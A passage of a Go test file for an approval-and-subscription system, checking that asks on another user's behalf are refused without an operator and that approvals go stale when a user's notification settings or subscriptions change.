		t.Fatalf("an approval by a former operator = %v", err)
	}
	if got := y.subs(t, "ada"); len(got) != 2 {
		t.Fatalf("the refused approval left ada with %v", got)
	}
	// A yard that names no operator has the user alone.
	if err := y.SetSetting(y.ctx, OperatorSetting, "", "bo"); err != nil {
		t.Fatal(err)
	}
	if _, err := y.AddAsk(y.ctx, y.bead, listAsk("mckean", "subscribe ada yardr --where kind=closed"), "yardmaster"); err == nil ||
		!strings.Contains(err.Error(), "this command is ada's to approve: the yard runs it as the one who approves, so mckean cannot be asked to") {
		t.Fatalf("an ask of another user in a yard with no operator = %v", err)
	}
	alone := y.ask(t, listAsk("ada", "subscribe ada yardr --where kind=closed"), "yardmaster")
	if _, err := y.ApproveAsk(y.ctx, y.bead, alone, "ada"); err != nil || len(y.subs(t, "ada")) != 3 {
		t.Fatalf("ada's own approval in a yard with no operator = %v, and ada subscribes to %v", err, y.subs(t, "ada"))
	}
}

// The card of a subscription says that it reaches the user outside the
// yard where a source tells them of notifications, and an approval is held
// to where the user is told: set anew, the ask is asked again. A
// subscription the user made in between is on the card too.
func TestRunAskSubscribeIsHeldToWhereTheUserIsTold(t *testing.T) {
	y := listYard(t)
	notifyAdapters = func() []string { return []string{"ntfy"} }
	t.Cleanup(func() { notifyAdapters = func() []string { return nil } })
	plain := y.ask(t, listAsk("mckean", "subscribe mckean yardr --done"), "yardmaster")
	if _, err := y.SetUser(y.ctx, "mckean", map[string]string{UserNotify: "ntfy"}, "mckean"); err != nil {
		t.Fatal(err)
	}
	y.refusedStale(t, plain, "ask "+jsonNumber(int(plain))+" was written when mckean was told outside the yard another way: that was set since (user_set, "+y.now.Local().Format("2 Jan 15:04")+", by mckean). ")

	told := y.ask(t, listAsk("mckean", "subscribe mckean yardr --done"), "yardmaster")
	if does := y.asked(t, told).Ask.Run.Does; len(does) != 2 ||
		does[1] != "Each is also sent to mckean outside the yard, through the source ntfy: it reaches their phone, or wherever ntfy tells them." {
		t.Fatalf("the card of a user who is told outside = %q", does)
	}
	// Told of mail alone, nothing of a notification leaves the yard.
	if _, err := y.SetUser(y.ctx, "mckean", map[string]string{UserTell: "mail"}, "mckean"); err != nil {
		t.Fatal(err)
	}
	y.refusedStale(t, told, "was told outside the yard another way")
	quiet := y.ask(t, listAsk("mckean", "subscribe mckean yardr --done"), "yardmaster")
	if does := y.asked(t, quiet).Ask.Run.Does; does[1] != "Nothing sends it on outside the yard: no source tells mckean of notifications there." {
		t.Fatalf("the card of a user told of mail alone = %q", does)
	}
	if err := y.AddSubscription(y.ctx, "mckean", Subscription{Source: SourceYardr, Scope: ScopeAll, Where: map[string]string{"state": StateDone}}, "mckean"); err != nil {
		t.Fatal(err)
	}
	y.refusedStale(t, quiet, "They have that subscription already.\" now: the card is from before that changed. ")
	if got := y.subs(t, "mckean"); len(got) != 1 {
		t.Fatalf("mckean subscribes to %v", got)
	}
}
